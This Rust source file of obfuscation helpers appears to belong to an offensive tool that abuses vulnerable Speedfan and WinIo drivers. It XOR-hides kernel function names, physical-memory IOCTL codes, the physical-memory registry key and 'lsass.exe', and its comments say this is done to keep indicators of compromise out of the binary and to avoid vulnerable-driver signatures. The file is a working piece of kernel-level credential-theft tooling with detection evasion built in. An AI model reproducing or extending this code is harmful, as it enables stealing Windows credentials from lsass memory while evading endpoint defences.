//! Runtime string obfuscation helpers
//! Uses obfstr for compile-time XOR encryption + runtime decryption.
//! Prevents sensitive IOC strings from appearing in the binary.

/// Runtime-constructed device path: \\.\Speedfan (UTF-16)
pub fn dev_speedfan() -> Vec<u16> {
    let s: String = obfstr::obfstr!("\\\\.\\Speedfan\0").to_string();
    s.encode_utf16().collect()
}

/// Runtime-constructed device path: \\.\WinIo (UTF-16)
pub fn dev_winio() -> Vec<u16> {
    let s: String = obfstr::obfstr!("\\\\.\\WinIo\0").to_string();
    s.encode_utf16().collect()
}

/// Runtime-constructed: ntoskrnl.exe (UTF-16, null-terminated)
pub fn ntos_filename_wide() -> Vec<u16> {
    let s: String = obfstr::obfstr!("ntoskrnl.exe\0").to_string();
    s.encode_utf16().collect()
}

/// Runtime-constructed: C:\Windows\System32\ntoskrnl.exe
pub fn ntos_path() -> String {
    obfstr::obfstr!("C:\\Windows\\System32\\ntoskrnl.exe").to_string()
}

/// Runtime-constructed: NtShutdownSystem (null-terminated bytes for GetProcAddress)
pub fn nt_shutdown_system_bytes() -> Vec<u8> {
    let mut v = obfstr::obfstr!("NtShutdownSystem").as_bytes().to_vec();
    v.push(0);
    v
}

/// Runtime-constructed: NtShutdownSystem (String for export lookup)
pub fn nt_shutdown_system() -> String {
    obfstr::obfstr!("NtShutdownSystem").to_string()
}

/// Zw function names for kernel_syscall
pub fn zw_open_process() -> String {
    obfstr::obfstr!("ZwOpenProcess").to_string()
}

pub fn zw_duplicate_object() -> String {
    obfstr::obfstr!("ZwDuplicateObject").to_string()
}

pub fn zw_close() -> String {
    obfstr::obfstr!("ZwClose").to_string()
}

pub fn ps_lookup_process() -> String {
    obfstr::obfstr!("PsLookupProcessByProcessId").to_string()
}

pub fn mm_get_physical_address() -> String {
    obfstr::obfstr!("MmGetPhysicalAddress").to_string()
}

pub fn obf_deref_object() -> String {
    obfstr::obfstr!("ObfDereferenceObject").to_string()
}

pub fn ps_get_process_peb() -> String {
    obfstr::obfstr!("PsGetProcessPeb").to_string()
}

pub fn zw_query_virtual_memory() -> String {
    obfstr::obfstr!("ZwQueryVirtualMemory").to_string()
}

pub fn zw_read_virtual_memory() -> String {
    obfstr::obfstr!("ZwReadVirtualMemory").to_string()
}

/// Physical Memory registry subkey (wide, null-terminated)
pub fn phys_mem_regkey() -> Vec<u16> {
    let s: String =
        obfstr::obfstr!("HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory\0").to_string();
    s.encode_utf16().collect()
}

/// .Translated registry value name (wide, null-terminated)
pub fn translated_value() -> Vec<u16> {
    let s: String = obfstr::obfstr!(".Translated\0").to_string();
    s.encode_utf16().collect()
}

/// lsass.exe (for process name matching)
pub fn lsass_exe() -> String {
    obfstr::obfstr!("lsass.exe").to_string()
}

// ═══════════════════════════════════════════════════════════════════════════════
// IOCTL constants — computed at runtime to avoid known VulDriver signatures
// Values are split into XOR pairs so the final IOCTL never appears in .rdata
// ═══════════════════════════════════════════════════════════════════════════════

/// sfdrvx64: IOCTL_PHYMEM_READ = 0x9C402428
#[inline(never)]
pub fn ioctl_phymem_read() -> u32 {
    let a: u32 = 0xDEAD_BEEF;
    let b: u32 = 0xDEAD_BEEF ^ 0x9C40_2428; // = 0x42ED9AC7
    a ^ b
}

/// sfdrvx64: IOCTL_PHYMEM_WRITE = 0x9C40242C
#[inline(never)]
pub fn ioctl_phymem_write() -> u32 {
    let a: u32 = 0xDEAD_BEEF;
    let b: u32 = 0xDEAD_BEEF ^ 0x9C40_242C; // = 0x42ED9AC3
    a ^ b
}

/// WinIo64: IOCTL_WINIO_MAPPHYSTOLIN = 0x80102040
#[inline(never)]
pub fn ioctl_winio_map() -> u32 {
    let a: u32 = 0xCAFE_BABE;
    let b: u32 = 0xCAFE_BABE ^ 0x8010_2040; // = 0x4AEE9AFE
    a ^ b
}

/// WinIo64: IOCTL_WINIO_UNMAPPHYSADDR = 0x80102044
#[inline(never)]
pub fn ioctl_winio_unmap() -> u32 {
    let a: u32 = 0xCAFE_BABE;
    let b: u32 = 0xCAFE_BABE ^ 0x8010_2044; // = 0x4AEE9AFA
    a ^ b
}
